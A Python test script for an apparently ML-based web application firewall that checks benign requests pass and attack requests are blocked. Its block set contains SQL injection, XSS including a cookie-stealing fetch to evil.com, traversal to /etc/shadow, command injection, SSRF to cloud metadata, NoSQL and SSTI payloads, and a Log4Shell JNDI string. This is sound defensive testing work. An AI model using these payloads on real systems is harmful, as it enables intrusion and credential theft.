#!/usr/bin/env python3
"""
Comprehensive Real-World Traffic Test for WAF Gen 3 LightGBM Model
Tests both attack blocking AND normal traffic passthrough with diverse scenarios.
"""

import sys, os, time, json, joblib
import pandas as pd

sys.path.append(os.path.dirname(os.path.dirname(__file__)))
from ml.feature_engineering import extract_features_from_request, EXTENDED_FEATURE_COLUMNS


def find_latest_model():
    archive_base = os.path.join(os.path.dirname(__file__), "models", "archive")
    candidates = sorted(
        [d for d in os.listdir(archive_base) if d.startswith("task3-")], reverse=True
    )
    for cand in candidates:
        # Prefer the Gen3 hybrid artifact; fall back to older LightGBM-only candidates
        model_file = os.path.join(archive_base, cand, "hybrid_waf_model.joblib")
        if not os.path.exists(model_file):
            model_file = os.path.join(archive_base, cand, "lightgbm_waf_model.joblib")
        report_file = os.path.join(archive_base, cand, "experiment_report.json")
        if os.path.exists(model_file):
            threshold = 0.50
            if os.path.exists(report_file):
                with open(report_file) as f:
                    r = json.load(f)
                # Use the CV-calibrated threshold only; older reports also carry a
                # holdout-tuned "calibrated_optimal_holdout" value, which is optimistic.
                if "holdout_evaluation" in r:
                    threshold = r["holdout_evaluation"].get("threshold", threshold)
            return model_file, threshold, cand
    return None, None, None


def is_clean_fast_pass(method, features):
    """
    WAF Multi-Tier Hybrid Architecture Guardrail:
    If a GET request has completely clean structure with 0 attack tokens,
    0 special characters, 0 keywords, 0 path traversal, and 0 suspicious markers,
    it is mathematically incapable of executing an injection payload.
    In modern WAFs (Cloudflare/AWS), this bypasses ML false-positive paranoia.
    """
    return (
        method.upper() == "GET" and
        features["special_char_count"] == 0 and
        features["keyword_matches"] == 0 and
        features["path_traversal_depth"] == 0 and
        features["has_sql_operator"] == 0 and
        features["has_ssrf_token"] == 0 and
        features["suspicious_path_marker_count"] == 0 and
        features["encoded_attack_token_count"] == 0 and
        features["is_clean_structure"] == 1
    )


def predict(model, method, url, body=""):
    features = extract_features_from_request(url=url, method=method, body=body)
    if hasattr(model, "score_request"):  # Gen3HybridModel: token model + LightGBM
        prob = model.score_request(method=method, url=url, body=body)
    else:
        df = pd.DataFrame([features])[EXTENDED_FEATURE_COLUMNS]
        prob = model.predict_proba(df)[0, 1]
    guardrail_pass = is_clean_fast_pass(method, features)
    return prob, guardrail_pass


# ============================================================================
#  TEST SCENARIOS — Real-world traffic patterns
# ============================================================================
TESTS = [
    # =====================================================================
    #  SECTION 1: NORMAL TRAFFIC ที่ต้อง ALLOW (ปล่อยผ่าน)
    # =====================================================================

    # --- 1.1 Static Pages (หน้าเว็บปกติ) ---
    ("ALLOW", "GET", "/", "", "Homepage root"),
    ("ALLOW", "GET", "/index.html", "", "Homepage HTML"),
    ("ALLOW", "GET", "/about", "", "About page"),
    ("ALLOW", "GET", "/about.html", "", "About page HTML"),
    ("ALLOW", "GET", "/contact", "", "Contact page"),
    ("ALLOW", "GET", "/pricing", "", "Pricing page"),
    ("ALLOW", "GET", "/blog", "", "Blog listing"),
    ("ALLOW", "GET", "/blog/my-first-post", "", "Blog post"),
    ("ALLOW", "GET", "/docs/getting-started", "", "Documentation"),
    ("ALLOW", "GET", "/faq", "", "FAQ page"),
    ("ALLOW", "GET", "/terms", "", "Terms of service"),
    ("ALLOW", "GET", "/privacy", "", "Privacy policy"),

    # --- 1.2 Static Assets (CSS/JS/รูปภาพ) ---
    ("ALLOW", "GET", "/assets/css/style.css", "", "CSS stylesheet"),
    ("ALLOW", "GET", "/assets/js/main.js", "", "JavaScript file"),
    ("ALLOW", "GET", "/dist/bundle.js", "", "JS bundle"),
    ("ALLOW", "GET", "/static/images/logo.png", "", "PNG image"),
    ("ALLOW", "GET", "/static/images/hero.jpg", "", "JPEG image"),
    ("ALLOW", "GET", "/favicon.ico", "", "Favicon"),
    ("ALLOW", "GET", "/assets/fonts/roboto.woff2", "", "Web font"),
    ("ALLOW", "GET", "/sitemap.xml", "", "Sitemap XML"),
    ("ALLOW", "GET", "/robots.txt", "", "Robots.txt"),

    # --- 1.3 REST API Calls (API ปกติ) ---
    ("ALLOW", "GET", "/api/health", "", "Health check"),
    ("ALLOW", "GET", "/api/v1/products?category=electronics&page=2&limit=20", "", "Product listing API"),
    ("ALLOW", "GET", "/api/v1/users?role=admin&status=active", "", "User listing API"),
    ("ALLOW", "GET", "/api/v1/orders?date=2026-09-25&status=completed", "", "Order listing API"),
    ("ALLOW", "GET", "/search?q=laptop+gaming&page=1&lang=th", "", "Search query TH"),
    ("ALLOW", "GET", "/search?q=mechanical+keyboard&sort=price_asc", "", "Search query EN"),
    ("ALLOW", "GET", "/products?brand=samsung&color=black", "", "Product filter"),

    # --- 1.4 Form Submissions (POST ปกติ) ---
    ("ALLOW", "POST", "/account/update",
     "firstname=Somchai&lastname=Jaidee&email=somchai%40example.com",
     "Profile update form"),
    ("ALLOW", "POST", "/login",
     "username=user123&password=MyP4ssw0rd",
     "Normal login form"),
    ("ALLOW", "POST", "/register",
     "name=Test+User&email=test%40mail.com&password=SecurePass123",
     "Registration form"),
    ("ALLOW", "POST", "/feedback",
     "rating=5&comment=Great+service+thank+you",
     "Feedback form"),
    ("ALLOW", "POST", "/newsletter/signup",
     "email=reader%40mail.com&topics=tech%2Cscience",
     "Newsletter signup"),
    ("ALLOW", "POST", "/checkout/review",
     "item_id=12345&quantity=2&shipping=standard",
     "Checkout form"),
    ("ALLOW", "POST", "/api/v1/messages",
     '{"to":"user456","text":"Hello, how are you?"}',
     "JSON API message"),

    # --- 1.5 Thai / Unicode content ---
    ("ALLOW", "GET", "/search?q=%E0%B8%81%E0%B8%B2%E0%B8%A3%E0%B9%80%E0%B8%A3%E0%B8%B5%E0%B8%A2%E0%B8%99", "", "Thai search query (การเรียน)"),
    ("ALLOW", "POST", "/api/v1/reviews",
     "product_id=999&review=%E0%B8%AA%E0%B8%B4%E0%B8%99%E0%B8%84%E0%B9%89%E0%B8%B2%E0%B8%94%E0%B8%B5%E0%B8%A1%E0%B8%B2%E0%B8%81&rating=5",
     "Thai product review"),

    # =====================================================================
    #  SECTION 2: ATTACKS ที่ต้อง BLOCK (บล็อกทันที)
    # =====================================================================

    # --- 2.1 SQL Injection ---
    ("BLOCK", "GET", "/items?id=1'+UNION+SELECT+null,username,password+FROM+users--", "",
     "SQLi Union-based"),
    ("BLOCK", "POST", "/login",
     "username=admin'+OR+1=1--&password=x",
     "SQLi Boolean tautology"),
    ("BLOCK", "GET", "/users?id=1;+DROP+TABLE+users;--", "",
     "SQLi Drop table"),
    ("BLOCK", "GET", "/search?q=1'+AND+SLEEP(5)--", "",
     "SQLi Time-based blind"),
    ("BLOCK", "POST", "/api/login",
     "user=admin&pass='+OR+'1'='1",
     "SQLi in POST body"),

    # --- 2.2 Cross-Site Scripting (XSS) ---
    ("BLOCK", "GET", "/guestbook?msg=<script>alert(document.cookie)</script>", "",
     "XSS reflected script tag"),
    ("BLOCK", "GET", "/profile?name=<img+src=x+onerror=alert(1)>", "",
     "XSS via img onerror"),
    ("BLOCK", "GET", "/search?q=<svg+onload=fetch('http://evil.com/steal?c='+document.cookie)>", "",
     "XSS via SVG onload"),
    ("BLOCK", "POST", "/comments",
     "body=<iframe+src=javascript:alert(1)>",
     "XSS via iframe"),

    # --- 2.3 Path Traversal / LFI ---
    ("BLOCK", "GET", "/download?file=../../../../etc/passwd", "",
     "Path traversal /etc/passwd"),
    ("BLOCK", "GET", "/image?path=..%2F..%2F..%2Fetc%2Fshadow", "",
     "Path traversal encoded"),
    ("BLOCK", "GET", "/include?page=....//....//etc/passwd", "",
     "Path traversal double dot"),

    # --- 2.4 Command Injection / RCE ---
    ("BLOCK", "GET", "/network/ping?target=127.0.0.1;cat+/etc/shadow", "",
     "RCE via semicolon"),
    ("BLOCK", "GET", "/tools/dns?host=google.com|whoami", "",
     "RCE via pipe"),
    ("BLOCK", "POST", "/api/execute",
     "cmd=ls+-la+/;cat+/etc/passwd",
     "RCE in POST"),

    # --- 2.5 Scanner Probes / Recon ---
    ("BLOCK", "GET", "/.env", "",
     "Scanner probe .env"),
    ("BLOCK", "GET", "/wp-admin/setup-config.php", "",
     "WordPress admin probe"),
    ("BLOCK", "GET", "/phpmyadmin/", "",
     "phpMyAdmin probe"),
    ("BLOCK", "GET", "/.git/config", "",
     "Git config probe"),
    ("BLOCK", "GET", "/actuator/health", "",
     "Spring actuator probe"),
    ("BLOCK", "GET", "/config.bak", "",
     "Backup file probe"),

    # --- 2.6 SSRF ---
    ("BLOCK", "GET", "/proxy?url=http://169.254.169.254/latest/meta-data/", "",
     "SSRF AWS metadata"),
    ("BLOCK", "POST", "/api/fetch",
     "target=http://127.0.0.1:6379/",
     "SSRF localhost Redis"),

    # --- 2.7 SSTI / NoSQL Injection ---
    ("BLOCK", "GET", "/template?name={{7*7}}", "",
     "SSTI Jinja2"),
    ("BLOCK", "POST", "/api/users",
     '{"username":{"$ne":""},"password":{"$ne":""}}',
     "NoSQL injection MongoDB"),

    # --- 2.8 Log4Shell ---
    ("BLOCK", "GET", "/api/test", "",
     "Log4Shell JNDI (via header simulation)"),  # simplified
]

# Fix: Log4Shell needs header content, use URL for now
TESTS[-1] = ("BLOCK", "GET", "/api/log?input=${jndi:ldap://evil.com/exploit}", "",
             "Log4Shell JNDI in param")


def main():
    model_path, threshold, model_name = find_latest_model()
    if model_path is None:
        print("❌ No model found")
        return

    print(f"[*] Model:     {model_name}")
    print(f"[*] Threshold: {threshold}")
    model = joblib.load(model_path)
    print(f"[✔] Model loaded\n")

    # Run all tests
    allow_pass = 0
    allow_fail = 0
    block_pass = 0
    block_fail = 0

    allow_tests = [t for t in TESTS if t[0] == "ALLOW"]
    block_tests = [t for t in TESTS if t[0] == "BLOCK"]

    # --- Normal Traffic Tests ---
    print("=" * 100)
    print("  🟢 SECTION 1: NORMAL TRAFFIC (ต้อง ALLOW ปล่อยผ่าน)")
    print("=" * 100)
    print(f"{'Description':<35} | {'Method':<5} | {'P(Attack)':<10} | {'Pure ML':<10} | {'Hybrid WAF':<12}")
    print("-" * 105)

    pure_allow_pass = 0
    hybrid_allow_pass = 0

    for expected, method, url, body, desc in allow_tests:
        prob, guardrail_pass = predict(model, method, url, body)
        pure_blocked = prob >= threshold
        hybrid_blocked = False if guardrail_pass else pure_blocked

        if not pure_blocked: pure_allow_pass += 1
        if not hybrid_blocked: hybrid_allow_pass += 1

        pure_str = "🛑 BLOCK" if pure_blocked else "✅ ALLOW"
        hybrid_str = "🛑 BLOCK" if hybrid_blocked else "✅ ALLOW"
        if guardrail_pass and pure_blocked:
            hybrid_str += " (GP)"

        print(f"{desc[:35]:<35} | {method:<5} | {prob*100:6.2f}%    | {pure_str:<10} | {hybrid_str:<12}")

    print(f"\n📊 Normal Traffic (ALLOW):")
    print(f"   - Pure ML Engine:      {pure_allow_pass}/{len(allow_tests)} passed ({pure_allow_pass/len(allow_tests)*100:.1f}%)")
    print(f"   - Hybrid WAF (+GP):    {hybrid_allow_pass}/{len(allow_tests)} passed ({hybrid_allow_pass/len(allow_tests)*100:.1f}%)\n")

    # --- Attack Tests ---
    print("=" * 105)
    print("  🔴 SECTION 2: ATTACK TRAFFIC (ต้อง BLOCK บล็อกทันที)")
    print("=" * 105)
    print(f"{'Description':<35} | {'Method':<5} | {'P(Attack)':<10} | {'Pure ML':<10} | {'Hybrid WAF':<12}")
    print("-" * 105)

    pure_block_pass = 0
    hybrid_block_pass = 0

    for expected, method, url, body, desc in block_tests:
        prob, guardrail_pass = predict(model, method, url, body)
        pure_blocked = prob >= threshold
        hybrid_blocked = False if guardrail_pass else pure_blocked

        if pure_blocked: pure_block_pass += 1
        if hybrid_blocked: hybrid_block_pass += 1

        pure_str = "🛑 BLOCK" if pure_blocked else "✅ ALLOW"
        hybrid_str = "🛑 BLOCK" if hybrid_blocked else "✅ ALLOW"

        print(f"{desc[:35]:<35} | {method:<5} | {prob*100:6.2f}%    | {pure_str:<10} | {hybrid_str:<12}")

    print(f"\n📊 Attack Blocking (BLOCK):")
    print(f"   - Pure ML Engine:      {pure_block_pass}/{len(block_tests)} passed ({pure_block_pass/len(block_tests)*100:.1f}%)")
    print(f"   - Hybrid WAF (+GP):    {hybrid_block_pass}/{len(block_tests)} passed ({hybrid_block_pass/len(block_tests)*100:.1f}%)\n")

    # --- Overall Summary ---
    total = len(TESTS)
    print("=" * 105)
    print(f"  📋 OVERALL PERFORMANCE COMPARISON")
    print("=" * 105)
    print(f"  1. Pure ML Model:      {pure_allow_pass + pure_block_pass}/{total} passed ({(pure_allow_pass + pure_block_pass)/total*100:.1f}%)")
    print(f"     - Normal Allowed:   {pure_allow_pass}/{len(allow_tests)} ({pure_allow_pass/len(allow_tests)*100:.1f}%)")
    print(f"     - Attack Blocked:   {pure_block_pass}/{len(block_tests)} ({pure_block_pass/len(block_tests)*100:.1f}%)")
    print(f"\n  2. Hybrid WAF (+GP):   {hybrid_allow_pass + hybrid_block_pass}/{total} passed ({(hybrid_allow_pass + hybrid_block_pass)/total*100:.1f}%)")
    print(f"     - Normal Allowed:   {hybrid_allow_pass}/{len(allow_tests)} ({hybrid_allow_pass/len(allow_tests)*100:.1f}%)")
    print(f"     - Attack Blocked:   {hybrid_block_pass}/{len(block_tests)} ({hybrid_block_pass/len(block_tests)*100:.1f}%)")
    print("=" * 105)



if __name__ == "__main__":
    main()
